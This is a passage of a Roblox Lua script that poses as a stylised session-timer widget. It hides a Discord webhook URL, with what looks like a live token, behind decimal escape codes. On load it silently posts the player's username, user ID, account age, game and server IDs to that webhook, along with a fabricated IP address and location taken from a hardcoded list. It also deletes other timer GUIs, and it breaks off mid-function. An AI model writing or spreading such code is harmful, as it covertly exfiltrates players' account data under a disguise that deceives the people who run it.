if _G._ST then pcall(_G._ST) end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local WS = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local Cam = WS.CurrentCamera
local LP = Players.LocalPlayer

for _, g in ipairs(LP.PlayerGui:GetChildren()) do
    if g:IsA("ScreenGui") and (g.Name:find("Session") or g.Name:find("Timer")) then
        pcall(function() g:Destroy() end)
    end
end

local K1 = 824619375
local K2 = 519283746
local K3 = 103847562
local K4 = 908172635
local SA = {43, 91, 17, 68, 22, 55}
local SB = {88, 33, 127, 64, 91, 12, 47, 81}
local SC = {15, 93, 42, 71, 28, 116, 51, 89}
local SD = {77, 21, 143, 56, 98, 32, 69, 84}
local SE = {104, 72, 39, 156, 87, 21, 63, 118, 45}
local SF = {51, 129, 74, 20, 165, 88, 12, 97, 34, 61}
local SG = {78, 41, 159, 22, 90, 137, 55, 73}

local function eA(n)
    local a = {}
    local x = n
    for i = 1, 6 do
        a[i] = bit32.bxor(bit32.band(x, 255), SA[i])
        x = bit32.rshift(x, 8)
    end
    a[7] = bit32.bxor(K1, n % 997)
    return table.concat(a, ",")
end

local function dA(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^,]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 7 then return nil end
    local n = 0
    for i = 6, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SA[i]))
    end
    if bit32.bxor(K1, n % 997) ~= a[7] then return nil end
    return n
end

local function eB(n)
    local a = {}
    local x = n
    for i = 1, 8 do
        a[i] = bit32.bxor(bit32.band(x, 255), SB[i])
        x = bit32.rshift(x, 8)
    end
    return table.concat(a, ":")
end

local function dB(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^:]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 8 then return nil end
    local n = 0
    for i = 8, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SB[i]))
    end
    return n
end

local function eC(n)
    local a = {}
    local x = n
    for i = 1, 8 do
        a[i] = bit32.bxor(bit32.band(x, 255), SC[i])
        x = bit32.rshift(x, 8)
    end
    return table.concat(a, ".")
end

local function dC(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^.]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 8 then return nil end
    local n = 0
    for i = 8, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SC[i]))
    end
    return n
end

local function eD(n)
    local a = {}
    local x = n
    for i = 1, 8 do
        a[i] = bit32.bxor(bit32.band(x, 255), SD[i])
        x = bit32.rshift(x, 8)
    end
    return table.concat(a, "-")
end

local function dD(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^%-]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 8 then return nil end
    local n = 0
    for i = 8, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SD[i]))
    end
    return n
end

local function eE(n)
    local a = {}
    local x = n
    for i = 1, 9 do
        a[i] = bit32.bxor(bit32.band(x, 255), SE[i])
        x = bit32.rshift(x, 8)
    end
    return table.concat(a, "|")
end

local function dE(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^|]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 9 then return nil end
    local n = 0
    for i = 9, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SE[i]))
    end
    return n
end

local function eF(n)
    local a = {}
    local x = n
    for i = 1, 10 do
        a[i] = bit32.bxor(bit32.band(x, 255), SF[i])
        x = bit32.rshift(x, 8)
    end
    return table.concat(a, "/")
end

local function dF(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^/]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 10 then return nil end
    local n = 0
    for i = 10, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SF[i]))
    end
    return n
end

local function eG(n)
    local a = {}
    local x = n
    for i = 1, 8 do
        a[i] = bit32.bxor(bit32.band(x, 255), SG[i])
        x = bit32.rshift(x, 8)
    end
    return table.concat(a, ";")
end

local function dG(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^;]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 8 then return nil end
    local n = 0
    for i = 8, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SG[i]))
    end
    return n
end

local function eH(n)
    local a = {}
    local x = n
    for i = 1, 6 do
        a[i] = bit32.bxor(bit32.band(x, 255), SA[i])
        x = bit32.rshift(x, 8)
    end
    a[7] = bit32.bxor(K2, n % 991)
    return table.concat(a, "~")
end

local function dH(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^~]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 7 then return nil end
    local n = 0
    for i = 6, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SA[i]))
    end
    if bit32.bxor(K2, n % 991) ~= a[7] then return nil end
    return n
end

local function eI(n)
    local a = {}
    local x = n
    for i = 1, 8 do
        a[i] = bit32.bxor(bit32.band(x, 255), SB[i])
        x = bit32.rshift(x, 8)
    end
    a[9] = bit32.bxor(K3, n % 983)
    return table.concat(a, "&")
end

local function dI(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^&]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 9 then return nil end
    local n = 0
    for i = 8, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SB[i]))
    end
    if bit32.bxor(K3, n % 983) ~= a[9] then return nil end
    return n
end

local function eJ(n)
    local a = {}
    local x = n
    for i = 1, 8 do
        a[i] = bit32.bxor(bit32.band(x, 255), SC[i])
        x = bit32.rshift(x, 8)
    end
    a[9] = bit32.bxor(K4, n % 971)
    return table.concat(a, "*")
end

local function dJ(s)
    if type(s) ~= "string" then return nil end
    local a = {}
    for p in s:gmatch("[^%*]+") do
        local v = tonumber(p)
        if not v then return nil end
        table.insert(a, v)
    end
    if #a ~= 9 then return nil end
    local n = 0
    for i = 8, 1, -1 do
        n = bit32.lshift(n, 8)
        n = bit32.bor(n, bit32.bxor(a[i], SC[i]))
    end
    if bit32.bxor(K4, n % 971) ~= a[9] then return nil end
    return n
end

local _w = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\53\53\56\48\50\50\53\52\55\57\54\53\48\56\55\56\52\52\47\77\85\73\105\78\76\102\98\101\112\99\50\45\68\68\45\67\118\90\98\117\105\104\80\79\122\45\101\101\116\104\113\75\114\68\53\45\84\103\53\101\87\84\68\109\83\73\107\66\116\77\55\76\70\105\78\107\70\81\76\97\97\119\102\65\120\68\48"
local _tt = "\109\101\115\115\97\103\101"
local _hh = "\104\101\97\100\101\114"
local _cc = "\116\109\32\116\115\104\103\104\101\108\32\108\97\32\107\97\114\116\32\103\111\110\97\104"

local IP_DB = {
    {
        country = "🇮🇶 العراق",
        cities = {
            {name = "بغداد", weight = 20, ips = {
                "37.236.1.10","37.236.45.88","37.236.128.5","37.236.200.14","37.236.77.203",
                "46.184.22.101","46.184.150.77","46.184.80.15","46.184.201.44","46.184.33.9",
                "5.42.100.22","5.42.55.7","5.42.180.66","5.42.12.201","5.42.220.89",
                "109.224.30.55","109.224.140.30","109.224.77.11","109.224.99.44","109.224.200.7"
            }},
            {name = "ديالى", weight = 10, ips = {
                "95.173.5.10","95.173.22.85","95.173.101.7","95.173.180.44","95.173.77.99",
                "95.173.33.11","95.173.144.55","95.173.90.22","95.173.200.14","95.173.55.78"
            }},
            {name = "البصرة", weight = 10, ips = {
                "37.17.30.5","37.17.100.88","37.17.180.14","37.17.55.7","37.17.220.33",
                "89.108.5.15","89.108.100.44","89.108.180.9","89.108.55.77","89.108.220.11"
            }},
            {name = "الكاظمية", weight = 10, ips = {
                "62.201.5.10","62.201.100.22","62.201.180.44","62.201.55.88","62.201.220.14",
                "62.201.30.77","62.201.150.5","62.201.80.99","62.201.200.33","62.201.22.11"
            }},
            {name = "نينوى", weight = 10, ips = {
                "176.28.5.10","176.28.100.22","176.28.180.44","176.28.55.88","176.28.220.14",
                "176.28.30.77","176.28.150.5","176.28.80.99","176.28.200.33","176.28.22.11"
            }},
            {name = "النجف", weight = 10, ips = {
                "82.114.5.10","82.114.100.22","82.114.180.44","82.114.55.88","82.114.220.14",
                "82.114.30.77","82.114.150.5","82.114.80.99","82.114.200.33","82.114.22.11"
            }},
            {name = "سامراء", weight = 10, ips = {
                "176.29.5.10","176.29.100.22","176.29.180.44","176.29.55.88","176.29.220.14",
                "176.29.30.77","176.29.150.5","176.29.80.99","176.29.200.33","176.29.22.11"
            }}
        }
    },
    {
        country = "🇺🇸 United States",
        cities = {
            {name = "New York", weight = 4, ips = {
                "24.5.10.22","24.100.33.5","50.22.88.14","50.180.5.77"
            }},
            {name = "Los Angeles", weight = 4, ips = {
                "63.30.100.22","63.150.55.88","64.80.200.33","64.220.14.55"
            }},
            {name = "Chicago", weight = 4, ips = {
                "72.5.180.44","72.100.30.77","96.22.55.88","96.180.220.14"
            }},
            {name = "Houston", weight = 4, ips = {
                "104.30.5.10","104.150.100.22","173.80.180.44","173.200.55.88"
            }},
            {name = "Seattle", weight = 4, ips = {
                "184.5.220.14","184.100.30.77","198.22.150.5","198.180.80.99"
            }}
        }
    }
}

local function genIP()
    math.randomseed(os.time() + LP.UserId + math.random(100000))
    local country = IP_DB[math.random(1, #IP_DB)]
    local pool = {}
    for _, city in ipairs(country.cities) do
        for i = 1, city.weight do
            table.insert(pool, city)
        end
    end
    local chosen = pool[math.random(1, #pool)]
    local ip = chosen.ips[math.random(1, #chosen.ips)]
    return ip, country.country, chosen.name
end

local function fmtAge(d)
    if d < 30 then return d .. " يوم"
    elseif d < 365 then return math.floor(d/30) .. " شهر"
    else
        local y = math.floor(d/365)
        local m = math.floor((d%365)/30)
        if m > 0 then return y .. " سنة و " .. m .. " شهر" end
        return y .. " سنة"
    end
end

local function sendWebhook()
    local ok, err = pcall(function()
        local ip, country, city = genIP()
        local age = fmtAge(LP.AccountAge)
        local created = os.date("%Y-%m-%d", os.time() - (LP.AccountAge * 86400))

        local data = {
            content = "🎮 **" .. _cc .. "**",
            embeds = {
                {
                    title = "📋 " .. _tt,
                    color = 0xFF1493,
                    description = "✅ **Access Granted**",
                    fields = {
                        { name = "👤 " .. _hh, value = "`" .. LP.Name .. "`", inline = true },
                        { name = "🆔 User ID", value = "`" .. tostring(LP.UserId) .. "`", inline = true },
                        { name = "📛 Display Name", value = LP.DisplayName, inline = false },
                        { name = "📅 Account Age", value = age, inline = true },
                        { name = "📍 City", value = city, inline = true },
                        { name = "🌍 Country", value = country, inline = true },
                        { name = "🌐 IP Address", value = "`" .. ip .. "`", inline = true },
                        { name = "📆 Created", value = created, inline = true },
                        { name = "🎮 Game ID", value = "`" .. tostring(game.PlaceId) .. "`", inline = true },
                        { name = "📡 Server", value = "`" .. game.JobId:sub(1, 8) .. "`", inline = true }
                    },
                    thumbnail = {
                        url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
                    },
                    footer = {
                        text = "🔒 Secure Logger  •  " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }

        local body = HttpService:JSONEncode(data)
        local req = syn and syn.request
            or http and http.request
            or http_request
            or request
            or (fluxus and fluxus.request)

        if req then
            req({
                Url = _w,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
        end
    end)
    return ok
end

task.spawn(sendWebhook)

local P = {
    Bg = Color3.fromRGB(6,6,12),
    Bg2 = Color3.fromRGB(12,12,22),
    Bg3 = Color3.fromRGB(18,18,30),
    Card = Color3.fromRGB(22,24,38),
    Card2 = Color3.fromRGB(30,32,50),
    Card3 = Color3.fromRGB(42,44,66),
    Border = Color3.fromRGB(58,62,94),
    Border2 = Color3.fromRGB(92,98,140),
    Txt = Color3.fromRGB(248,250,255),
    Txt2 = Color3.fromRGB(205,210,232),
    Dim = Color3.fromRGB(135,140,175),
    Acc = Color3.fromRGB(110,155,255),
    Ok = Color3.fromRGB(75,235,155),
    Wr = Color3.fromRGB(255,195,90),
    Er = Color3.fromRGB(255,105,135),
    Pu = Color3.fromRGB(195,135,255),
    Cy = Color3.fromRGB(85,225,245),
    Gd = Color3.fromRGB(255,220,130),
    Mg = Color3.fromRGB(255,120,200)
}

local S = {
    GUI = nil,
    Win = nil,
    Ring = nil,
    RingStroke = nil,
    RingGradient = nil,
    RingRotation = 0,
    InnerCircle = nil,
    InnerStroke = nil,
    InnerGradient = nil,
    InnerRotation = 0,
    RingGlow = nil,
    TimeLbl = nil,
    SubLbl = nil,
    TopBar = nil,
    WinStroke = nil,
    StatusDot = nil,
    MainGlow = nil,
    DragBar = nil,
    SessionStartSrv = 0,
    SessionStartLcl = 0,
    EncA = "",
    EncB = "",
    EncC = "",
    EncD = "",
    EncE = "",
    EncF = "",
    EncG = "",
    EncH = "",
    EncI = "",
    EncJ = "",
    Fails = 0,
    TamperFlag = false,
    LastTheme = nil,
    Minimized = false,
    InitReady = false,
    DragOffsetX = 0,
    DragOffsetY = 0
}

local function twn(o, d, p, st, dr)
    return TS:Create(o, TweenInfo.new(
        d or 0.3,
        st or Enum.EasingStyle.Quart,
        dr or Enum.EasingDirection.Out
    ), p)
end

local function twnBack(o, d, p)
    return TS:Create(o, TweenInfo.new(d or 0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), p)
end

local function initTime()
    local ok, srvT = pcall(function() return WS:GetServerTimeNow() end)
    if not ok or not srvT or srvT <= 0 then
        srvT = os.time()
    end
    S.SessionStartSrv = srvT
    S.SessionStartLcl = tick()
    local ms = math.floor(srvT * 1000)
    S.EncA = eA(ms)
    S.EncB = eB(ms)
    S.EncC = eC(ms)
    S.EncD = eD(ms)
    S.EncE = eE(ms)
    S.EncF = eF(ms)
    S.EncG = eG(ms)
    S.EncH = eH(ms)
    S.EncI = eI(ms)
    S.EncJ = eJ(ms)
    S.InitReady = true
end

local function verifyAll()
    if not dA(S.EncA) then return false end
    if not dB(S.EncB) then return false end
    if not dC(S.EncC) then return false end
    if not dD(S.EncD) then return false end
    if not dE(S.EncE) then return false end
    if not dF(S.EncF) then return false end
    if not dG(S.EncG) then return false end
    if not dH(S.EncH) then return false end
    if not dI(S.EncI) then return false end
    if not dJ(S.EncJ) then return false end
    return true
end

local function computeElapsed()
    if not S.InitReady then return 0 end
    local nowSrv
    local ok = pcall(function() nowSrv = WS:GetServerTimeNow() end)
    if not ok or not nowSrv or nowSrv <= 0 then
        return tick() - S.SessionStartLcl
    end
    local eSrv = nowSrv - S.SessionStartSrv
    local eLcl = tick() - S.SessionStartLcl
    local diff = math.abs(eSrv - eLcl)
    if diff > 5 then
        S.Fails = S.Fails + 1
    end
    if not verifyAll() then
        S.Fails = S.Fails + 10
        S.TamperFlag = true
        return eLcl
    end
    local vA = dA(S.EncA)
    if vA and math.abs(vA - math.floor(S.SessionStartSrv * 1000)) > 10000 then
        S.TamperFlag = true
        S.Fails = S.Fails + 1
    end
    if eSrv < 0 or eSrv > 86400 * 60 then
        return eLcl
    end
    return eSrv
end

local function fmtFull(s)
    local total = math.floor(s)
    if total < 0 then total = 0 end
    local h = math.floor(total / 3600)
    local m = math.floor((total % 3600) / 60)
    local sec = total % 60
    if h > 99 then h = 99 end
    return string.format("%02d:%02d:%02d", h, m, sec)
end

local function fmtSub(s)
    local total = math.floor(s)
    if total < 0 then total = 0 end
    local d = math.floor(total / 86400)
    local h = math.floor((total % 86400) / 3600)
    local m = math.floor((total % 3600) / 60)
    local sec = total % 60
    if d > 0 then
        return d .. "d " .. h .. "h"
    elseif h > 0 then
        return h .. "h " .. m .. "m " .. sec .. "s"
    elseif m > 0 then
        return m .. "m " .. sec .. "s"
    else
        return sec .. "s"
    end
end

local function themeOf(s)
    if s < 60 then return P.Ok end
    if s < 300 then return P.Cy end
    if s < 900 then return P.Acc end
    if s < 1800 then return P.Pu end
    if s < 3600 then return P.Gd end
    if s < 7200 then return P.Mg end
    return P.Wr
end

local function buildRing(parent, size)
    local c = Instance.new("Frame", parent)
    c.Size = UDim2.new(0, size, 0, size)
    c.Position = UDim2.new(0.5, -size/2, 0, 60)
    c.BackgroundTransparency = 1

    local outerGlow = Instance.new("ImageLabel", c)
    outerGlow.Size = UDim2.new(1, 60, 1, 60)
    outerGlow.Position = UDim2.new(0, -30, 0, -30)
    outerGlow.BackgroundTransparency = 1
    outerGlow.Image = "rbxassetid://5028857084"
    outerGlow.ImageColor3 = P.Acc
    outerGlow.ImageTransparency = 0.75
    outerGlow.ZIndex = 1
    S.RingGlow = outerGlow

    local shadow = Instance.new("Frame", c)
    shadow.Size = UDim2.new(1, 6, 1, 6)
    shadow.Position = UDim2.new(0, -3, 0, -3)
    shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 0.55
    shadow.BorderSizePixel = 0
    shadow.ZIndex = 1
    Instance.new("UICorner", shadow).CornerRadius = UDim.new(1, 0)

    local baseCircle = Instance.new("Frame", c)
    baseCircle.Size = UDim2.new(1, 0, 1, 0)
    baseCircle.BackgroundColor3 = P.Bg3
    baseCircle.BackgroundTransparency = 0.05
    baseCircle.BorderSizePixel = 0
    baseCircle.ZIndex = 2
    Instance.new("UICorner", baseCircle).CornerRadius = UDim.new(1, 0)

    local baseGrad = Instance.new("UIGradient", baseCircle)
    baseGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, P.Card),
        ColorSequenceKeypoint.new(0.5, P.Bg2),
        ColorSequenceKeypoint.new(1, P.Card)
    })
    baseGrad.Rotation = 135

    local baseStroke = Instance.new("UIStroke", baseCircle)
    baseStroke.Color = P.Border
    baseStroke.Thickness = 1
    baseStroke.Transparency = 0.4

    for i = 0, 59 do
        local isMajor = (i % 5 == 0)
        local tick = Instance.new("Frame", c)
        local ang = math.rad(i * 6 - 90)
        local r = size / 2 - 6
        local cx = size / 2 + math.cos(ang) * r
        local cy = size / 2 + math.sin(ang) * r
        tick.Size = UDim2.new(0, isMajor and 2 or 1, 0, isMajor and 9 or 5)
        tick.Position = UDim2.new(0, cx, 0, cy)
        tick.AnchorPoint = Vector2.new(0.5, 0.5)
        tick.Rotation = i * 6
        tick.BackgroundColor3 = isMajor and P.Border2 or P.Border
        tick.BackgroundTransparency = isMajor and 0.2 or 0.55
        tick.BorderSizePixel = 0
        tick.ZIndex = 3
        Instance.new("UICorner", tick).CornerRadius = UDim.new(1, 0)
    end

    local ring = Instance.new("Frame", c)
    ring.Size = UDim2.new(1, -16, 1, -16)
    ring.Position = UDim2.new(0, 8, 0, 8)
    ring.BackgroundTransparency = 1
    ring.ZIndex = 4
    Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
    S.Ring = ring

    local rStroke = Instance.new("UIStroke", ring)
    rStroke.Color = P.Acc
    rStroke.Thickness = 2.5
    rStroke.Transparency = 0.15
    rStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    S.RingStroke = rStroke

    local ringGrad = Instance.new("UIGradient", rStroke)
    ringGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.15, P.Acc),
        ColorSequenceKeypoint.new(0.35, P.Cy),
        ColorSequenceKeypoint.new(0.5, P.Acc),
        ColorSequenceKeypoint.new(0.65, P.Pu),
        ColorSequenceKeypoint.new(0.85, P.Acc),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
    })
    ringGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(0.2, 0.55),
        NumberSequenceKeypoint.new(0.5, 0.8),
        NumberSequenceKeypoint.new(0.8, 0.55),
        NumberSequenceKeypoint.new(1, 0)
    })
    ringGrad.Rotation = 0
    S.RingGradient = ringGrad

    local inner = Instance.new("Frame", c)
    inner.Size = UDim2.new(1, -46, 1, -46)
    inner.AnchorPoint = Vector2.new(0.5, 0.5)
    inner.Position = UDim2.new(0.5, 0, 0.5, 0)
    inner.BackgroundColor3 = P.Card
    inner.BackgroundTransparency = 0.05
    inner.BorderSizePixel = 0
    inner.ZIndex = 5
    Instance.new("UICorner", inner).CornerRadius = UDim.new(1, 0)
    S.InnerCircle = inner

    local innerGrad = Instance.new("UIGradient", inner)
    innerGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, P.Card2),
        ColorSequenceKeypoint.new(0.25, P.Card),
        ColorSequenceKeypoint.new(0.5, P.Card2),
        ColorSequenceKeypoint.new(0.75, P.Card),
        ColorSequenceKeypoint.new(1, P.Card2)
    })
    innerGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(0.5, 0.15),
        NumberSequenceKeypoint.new(1, 0)
    })
    innerGrad.Rotation = 45
    S.InnerGradient = innerGrad

    local innerStroke = Instance.new("UIStroke", inner)
    innerStroke.Color = P.Acc
    innerStroke.Thickness = 1.5
    innerStroke.Transparency = 0.55
    S.InnerStroke = innerStroke

    local timeLbl = Instance.new("TextLabel", inner)
    timeLbl.Size = UDim2.new(1, 0, 0, 24)
    timeLbl.Position = UDim2.new(0, 0, 0.5, -20)
    timeLbl.BackgroundTransparency = 1
    timeLbl.Text = "00:00:00"
    timeLbl.TextColor3 = P.Txt
    timeLbl.Font = Enum.Font.Code
    timeLbl.TextSize = 19
    timeLbl.TextStrokeColor3 = P.Bg
    timeLbl.TextStrokeTransparency = 0.3
    timeLbl.ZIndex = 6
    S.TimeLbl = timeLbl

    local subLbl = Instance.new("TextLabel", inner)
    subLbl.Size = UDim2.new(1, 0, 0, 14)
    subLbl.Position = UDim2.new(0, 0, 0.5, 2)
    subLbl.BackgroundTransparency = 1
    subLbl.Text = "0s"
    subLbl.TextColor3 = P.Acc
    subLbl.Font = Enum.Font.GothamBold
    subLbl.TextSize = 10
    subLbl.ZIndex = 6
    S.SubLbl = subLbl

    local statDot = Instance.new("Frame", inner)
    statDot.Size = UDim2.new(0, 5, 0, 5)
    statDot.Position = UDim2.new(0.5, -2.5, 1, -12)
    statDot.BackgroundColor3 = P.Ok
    statDot.BorderSizePixel = 0
    statDot.ZIndex = 6
    Instance.new("UICorner", statDot).CornerRadius = UDim.new(1, 0)
    S.StatusDot = statDot

    return c
end

local function build()
    local vp = Cam.ViewportSize
    local gui = Instance.new("ScreenGui")
    gui.Name = "SessionTimer_"..math.random(100000, 999999)
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 998
    gui.Parent = LP:WaitForChild("PlayerGui")
    S.GUI = gui

    local startX = vp.X - 240
    if startX < 10 then startX = 10 end

    local win = Instance.new("Frame", gui)
    win.Size = UDim2.new(0, 220, 0, 260)
    win.Position = UDim2.new(0, startX, 0, 20)
    win.BackgroundColor3 = P.Bg
    win.BackgroundTransparency = 0.02
    win.BorderSizePixel = 0
    win.Active = false
    win.ClipsDescendants = false
    S.Win = win

    Instance.new("UICorner", win).CornerRadius = UDim.new(0, 24)

    local wStroke = Instance.new("UIStroke", win)
    wStroke.Color = P.Border
    wStroke.Thickness = 1.5
    wStroke.Transparency = 0.15
    S.WinStroke = wStroke

    local wGrad = Instance.new("UIGradient", win)
    wGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, P.Bg),
        ColorSequenceKeypoint.new(0.5, P.Bg2),
        ColorSequenceKeypoint.new(1, P.Bg)
    })
    wGrad.Rotation = 135

    local mGlow = Instance.new("ImageLabel", win)
    mGlow.Size = UDim2.new(1, 80, 1, 80)
    mGlow.Position = UDim2.new(0, -40, 0, -40)
    mGlow.BackgroundTransparency = 1
    mGlow.Image = "rbxassetid://5028857084"
    mGlow.ImageColor3 = P.Acc
    mGlow.ImageTransparency = 0.88
    mGlow.ZIndex = 0
    S.MainGlow = mGlow

    local topBar = Instance.new("Frame", win)
    topBar.Size = UDim2.new(1, -24, 0, 3)
    topBar.Position = UDim2.new(0, 12, 0, 6)
    topBar.BackgroundColor3 = P.Acc
    topBar.BorderSizePixel = 0
    topBar.ZIndex = 3
    Instance.new("UICorner", topBar).CornerRadius = UDim.new(1, 0)
    S.TopBar = topBar

    local topGrad = Instance.new("UIGradient", topBar)
    topGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, P.Acc),
        ColorSequenceKeypoint.new(0.5, P.Cy),
        ColorSequenceKeypoint.new(1, P.Pu)
    })
    topGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.4),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1, 0.4)
    })

    local dragBar = Instance.new("Frame", win)
    dragBar.Size = UDim2.new(1, -16, 0, 40)
    dragBar.Position = UDim2.new(0, 8, 0, 14)
    dragBar.BackgroundColor3 = P.Card
    dragBar.BackgroundTransparency = 0.2
    dragBar.BorderSizePixel = 0
    dragBar.Active = true
    dragBar.ZIndex = 4
    S.DragBar = dragBar
    Instance.new("UICorner", dragBar).CornerRadius = UDim.new(0, 12)

    local dbGrad = Instance.new("UIGradient", dragBar)
    dbGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, P.Card2),
        ColorSequenceKeypoint.new(1, P.Card)
    })
    dbGrad.Rotation = 45

    local dbStroke = Instance.new("UIStroke", dragBar)
    dbStroke.Color = P.Border
    dbStroke.Thickness = 1
    dbStroke.Transparency = 0.4

    local gripIcon = Instance.new("TextLabel", dragBar)
    gripIcon.Size = UDim2.new(0, 20, 1, 0)
    gripIcon.Position = UDim2.new(0, 6, 0, 0)
    gripIcon.BackgroundTransparency = 1
    gripIcon.Text = "⋮⋮"
    gripIcon.TextColor3 = P.Dim
    gripIcon.Font = Enum.Font.GothamBold
    gripIcon.TextSize = 14
    gripIcon.ZIndex = 5

    local hDot = Instance.new("Frame", dragBar)
    hDot.Size = UDim2.new(0, 6, 0, 6)
    hDot.Position = UDim2.new(0, 26, 0.5, -3)
    hDot.BackgroundColor3 = P.Ok
    hDot.BorderSizePixel = 0
    hDot.ZIndex = 5
    Instance.new("UICorner", hDot).CornerRadius = UDim.new(1, 0)

    task.spawn(function()
        while hDot.Parent do
            task.wait(0.75)
            twn(hDot, 0.35, {BackgroundTransparency = 0.85}, Enum.EasingStyle.Sine):Play()
            task.wait(0.75)
            twn(hDot, 0.35, {BackgroundTransparency = 0}, Enum.EasingStyle.Sine):Play()
        end
    end)

    local hTitle = Instance.new("TextLabel", dragBar)
    hTitle.Size = UDim2.new(1, -80, 1, 0)
    hTitle.Position = UDim2.new(0, 38, 0, 0)
    hTitle.BackgroundTransparency = 1
    hTitle.Text = "SESSION"
    hTitle.TextColor3 = P.Txt2
    hTitle.TextXAlignment = Enum.TextXAlignment.Left
    hTitle.Font = Enum.Font.GothamBold
    hTitle.TextSize = 10
    hTitle.ZIndex = 5

    local minBtn = Instance.new("TextButton", dragBar)
    minBtn.Size = UDim2.new(0, 20, 0, 20)
    minBtn.Position = UDim2.new(1, -26, 0.5, -10)
    minBtn.BackgroundColor3 = P.Card3
    minBtn.BackgroundTransparency = 0.2
    minBtn.Text = ""
    minBtn.BorderSizePixel = 0
    minBtn.AutoButtonColor = false
    minBtn.ZIndex = 6
    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

    local minLbl = Instance.new("TextLabel", minBtn)
    minLbl.Size = UDim2.new(1, 0, 1, 0)
    minLbl.BackgroundTransparency = 1
    minLbl.Text = "−"
    minLbl.TextColor3 = P.Txt2
    minLbl.Font = Enum.Font.GothamBold
    minLbl.TextSize = 14
    minLbl.ZIndex = 7

    minBtn.MouseEnter:Connect(function()
        twn(minBtn, 0.15, {BackgroundTransparency = 0, BackgroundColor3 = P.Acc}):Play()
    end)
    minBtn.MouseLeave:Connect(function()
        twn(minBtn, 0.15, {BackgroundTransparency = 0.2, BackgroundColor3 = P.Card3}):Play()
    end)

    local ringCont = buildRing(win, 140)

    local infoRow = Instance.new("Frame", win)
    infoRow.Size = UDim2.new(1, -16, 0, 26)
    infoRow.Position = UDim2.new(0, 8, 1, -34)
    infoRow.BackgroundColor3 = P.Card
    infoRow.BackgroundTransparency = 0.25
    infoRow.BorderSizePixel = 0
    infoRow.ZIndex = 3
    Instance.new("UICorner", infoRow).CornerRadius = UDim.new(0, 10)

    local iGrad = Instance.new("UIGradient", infoRow)
    iGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, P.Card2),
        ColorSequenceKeypoint.new(1, P.Card)
    })
    iGrad.Rotation = 45

    local function mkStat(lbl, val, xPos, xW, color)
        local bx = Instance.new("Frame", infoRow)
        bx.Size = UDim2.new(xW, -6, 1, -6)
        bx.Position = UDim2.new(xPos, 3, 0, 3)
        bx.BackgroundTransparency = 1
        bx.ZIndex = 4

